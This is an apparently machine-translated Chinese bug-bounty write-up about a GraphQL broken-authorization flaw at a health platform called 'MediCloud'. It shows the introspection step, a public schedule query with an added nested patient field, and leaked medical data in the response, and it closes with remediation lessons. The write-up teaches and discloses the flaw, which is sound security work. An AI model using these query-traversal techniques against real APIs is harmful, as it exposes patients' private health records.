---
title: GraphQL授权检查缺失如何暴露了一台HealthTech独角兽的医疗记录
url: https://mp.weixin.qq.com/s/UgKpjuCFkoKDwnF-QICANQ
source: Doonsec's feed
date: 2026-06-22
fetch_date: 2026-06-23T06:06:08.792250
---

# GraphQL授权检查缺失如何暴露了一台HealthTech独角兽的医疗记录

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/R98u9GTbBns1PrGskBAaNZJPkC6ravUfQczlqg3dyHGrhja6hW4hDrXGepSYB6g3oKeDkRbphQxwSU6fqAyOSpntryBn9HEsS1ltdw4Hia3k/0?wx_fmt=jpeg)

# GraphQL授权检查缺失如何暴露了一台HealthTech独角兽的医疗记录

haidragon
haidragon

安全狗的自我修养

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

作者介绍：http://gitee.com/haidragon

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/R98u9GTbBnu3Hic72RX3AvfQELk9scWrEzzqZ1MgRibC5rhlaXnjOISuYCQn1IvbdPboAWxtibEuv1Xb3Ur7erA2cQ2zMwWbLJMBaLYLkJ18M8/640?wx_fmt=jpeg&from=appmsg)

在现代API的世界里，GraphQL是王者。它灵活高效，允许前端开发者通过单一查询准确请求所需数据。你不需要同时访问十个不同的 REST 端点，而是提出你想要的东西，GraphQL 就能满足你的需求。

但这种灵活性是一把双刃剑。由于GraphQL作为单一数据网关，保护其安全性需要在各个解析器层进行严格的对象级授权检查。如果开发者忘记保护某个特定的关系字段，整个数据库可能会泄露。

这是一个著名的健康科技平台——我们称之**为MediCloud**——如何因嵌套GraphQL解析器中缺失的一次检查，意外暴露了超过两百万患者的私人病历、实验室结果和诊断历史的故事。

该漏洞仅用不到十分钟完成，并获得了**14,000美元的昆虫悬赏**。

## 目标：患者仪表盘

MediCloud提供在线门户，患者可以查看处方、给医生发消息并下载化验结果。

当你登录患者仪表盘时，浏览器会发送一个标准的 GraphQL POST 请求，以填充用户界面。我用 Burp Suite 拦截了这个请求，分析了查询结构：`/api/graphql`

GraphQL

```
query GetPatientDashboard {
  me {
id
    firstName
    lastName
    email
    appointments {
id
date
      doctorName
    }
  }
}
```

回复完全还给了我的账户信息。如果我在查询中尝试更改自己的，服务器会阻止。应用程序正确验证了我的会话Cookie，并将范围严格绑定到我认证的用户ID。`id``me``me`

从外观上看，该 API 完全抵御了标准的破坏对象级授权（BOLA）攻击。

## 足迹：深入剖析GraphQL架构

测试GraphQL的真正力量在于**内省**。内省是内置功能，允许任何人查询API的整个模式，揭示所有可用的数据类型、查询、变异和关系。

许多生产环境会禁用内省功能，但MediCloud在其镜像生产环境的临时网关上保留了内省功能。我运行了内省查询，绘制了他们的模式。

我发现了一个类型，叫做，它包含一个嵌套字段，名为：`Appointment``patient`

GraphQL

```
typeAppointment {
id:ID!
date:String!
doctorName:String!
patient:PatientProfile!# <--- Interesting relationship
}
```

```
type PatientProfile {
  id: ID!
  medicalHistory: String
  bloodType: String
  diagnoses: [String]
}
```

这意味着如果你能直接通过ID查询一个物体，理论上你可以请求与其连接的对象，从而提取它们高度敏感的医疗数据。`Appointment``patient`

## 转折点：嵌套解析器绕过

我找了个根级查询，可以直接按ID获取约会。我找到了一个：。`appointment(id: ID!)`

我尝试查询另一用户的预约ID：

GraphQL

```
query {
  appointment(id: "88392") {
date
    doctorName
  }
}
```

**结果：** `403 Forbidden - You are not authorized to view this appointment.`

开发者成功对根查询进行了授权检查。系统会核实登录用户的ID是否与该预约关联的患者ID相符。如果没有，申请就会被拒绝。`appointment`

但这就是 GraphQL 架构变得棘手的地方。根查询并不是访问对象的唯一方式。如果我们通过图表中完全不同的、无关的路径访问预约，会发生什么？

我扫描了模式中其他返回该类型的字段，发现门户公共调度小部件使用了一个完全独立的查询：。`Appointment``publicDoctorSchedule(doctorName: String!)`

这个查询是完全公开的，因为未经认证的用户需要看到医生何时可以预约空位。

GraphQL

```
query {
  publicDoctorSchedule(doctorName: "Dr. Smith") {
id
date
  }
}
```

回复中列出了即将到来的预约时间段，包括已被其他患者预订的独特时段数值。`id`

因为它是公共目录，根授权检查是完全开放的。但如果我直接在这个公开查询中附加嵌套字段呢？`publicDoctorSchedule``patient`

## 漏洞利用：对敏感数据的图遍历

我设计了一个针对医生公开排班的查询，但我超越了公开和字段，深入图表，请求与那些已预订时段关联的私人档案：`id``date``patient`

GraphQL

```
query {
  publicDoctorSchedule(doctorName: "Dr. Smith") {
id
date
    patient {
id
      medicalHistory
      diagnoses
    }
  }
}
```

我点**了发送**。

JSON

```
{
"data":{
"publicDoctorSchedule":[
{
"id":"88392",
"date":"2026-07-14",
"patient":{
"id":"USR_99210",
"medicalHistory":"Patient presented with acute fatigue...",
"diagnoses":["Type 2 Diabetes","Hypertension"]
}
}
]
}
}
```

数据库里把一切都丢掉了。

这里的安全漏洞是灾难性的。虽然开发者已经确保了根级查询的安全，但他们完全忘记在单个*解析器函数*中为该字段在其他类型中嵌套时写授权检查。`appointment(id)``patient`

因为GraphQL在查询树中独立评估字段，公开查询允许我获取预约对象，后端则盲目执行嵌套解析器，未确认我是否有权限查看该患者资料。通过脚本循环切换医生姓名，攻击者可以抓取整个患者数据库。`patient`

## 修复与赔偿

我立刻关闭了测试工具，编写了一份报告，包含一个最小化的查询，显示漏洞，并根据巨大的受保护健康信息（PHI）暴露风险，将其标记为最大严重程度。

* **提交：**

  星期三，下午4：00
* 作为**P1（危急）进行分诊：**星期三，下午4：45（API网关暂时离线进行热修复）
* **修复已验证：**

  星期三，晚上7：30
* **奖金：****14,000美元**

MediCloud通过实现集中授权中间件层解决了这个问题。他们不再仅将安全逻辑放在顶层查询上，而是直接在解析器内部强制执行字段级安全检查，确保无论请求上下文会话在图结构的哪个位置被调用，都能验证。`PatientProfile`

## 核心课程

* **给开发者：**

  切勿将查询级安全与现场授权混为一谈。在GraphQL中，任何敏感数据类型都必须在*解析*层实现授权。如果某个类型包含私有数据，其解析器每次获取时都必须验证用户权限，无论父查询为何。
* **对于昆虫猎人：**

  始终用内省（或者如果内省失效，也可以用现场猜测工具）绘制整个GraphQL架构。寻找数据循环和备选路径。如果直接路径被阻断，查找公共查询中的关系链接，看看嵌套字段是否缺乏合适的防御保护。
* ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnuwfRPWlicSicWOwpxF28A1xah9LegxIWrLIYrmeA9A1maScVt6yyaLVciaCGWHTu5HkbOFTg2ZibSleISsbjKjVB13dKTDpvsKlKc/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=5)

  ![图片](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBntcS9Jtb8mk70Oe21TiacyFhsD7oHcT5vPibKyKFPDrxu4rAZH44CiaoQnhE2yX6HkPn7QNRKr6LyHUAA0nZr1lndibVriaRdEOOu4g/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=7)

  ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPZeRlpCaIfwnM0IM4vnVugkAyDFJlhe1Rkalbz0a282U9iaVU12iaEiahw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=z84f6pb5&tp=webp#imgIndex=5)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERH8N8KjDo7DwKbNkHbLeSV917gqKcuKHWeINcgDQYWVq7WaRpFQCc3TvfLLJrrjaiaLCElA7oflv0A/0?wx_fmt=png)

安全狗的自我修养

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERH8N8KjDo7DwKbNkHbLeSV917gqKcuKHWeINcgDQYWVq7WaRpFQCc3TvfLLJrrjaiaLCElA7oflv0A/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过